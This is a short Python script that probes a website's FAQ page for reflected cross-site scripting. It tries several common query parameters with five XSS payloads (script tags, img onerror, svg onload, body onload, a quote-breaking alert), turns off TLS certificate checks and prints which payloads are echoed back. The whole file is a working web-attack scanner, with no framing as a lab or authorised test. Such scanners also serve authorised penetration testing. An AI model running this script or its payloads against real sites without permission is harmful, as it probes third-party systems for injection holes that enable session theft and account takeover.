import requests
from urllib.parse import urlencode

params_to_test = ["id", "page", "search", "module", "query", "keyword", "term"]
base_url = "https://taret.com/index.php/faqs"

payloads = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "\"><svg/onload=alert(1)>",
    "<body onload=alert('XSS')>",
    "';alert(1)//"
]

for param in params_to_test:
    for payload in payloads:
        query = {param: payload}
        url = f"{base_url}?{urlencode(query)}"
        try:
            res = requests.get(url, verify=False, timeout=10)
            if payload in res.text:
                print(f"[🔥] REFLECTED! Param: {param} | Payload: {payload} | URL: {url}")
            else:
                print(f"[ ] Not Reflected | Param: {param} | Payload: {payload}")
        except Exception as e:
            print(f"[✖] Error on {url} → {str(e)}")
